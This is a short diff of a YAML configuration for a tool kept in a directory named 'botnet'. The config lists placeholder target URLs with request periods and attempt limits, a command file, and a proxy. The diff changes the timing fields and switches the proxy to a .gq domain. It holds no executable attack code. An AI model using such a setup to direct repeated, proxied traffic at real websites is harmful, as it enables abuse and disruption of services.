@@ -8,15 +8,13 @@ logfile: "/home/giammp/botnet/log.txt"
 cmdfile: "/home/giammp/botnet/cmd.txt"
 targets:
   - url: "http://www.target1.com"
-    timeMin: 10000
-    timeMax: 20000
+    period: 1
     maxAttempts: 10
   - url: "http://www.target2.com"
-    timeMin: 15000
-    timeMax: 20000
+    period: 2-4
     maxAttempts: 15
 proxy:
-  address: "http://www.proxy1.com"
+  address: "http://www.securewebproxy.gq"
   port: 80
 sleep:
   - condition: "expression1"
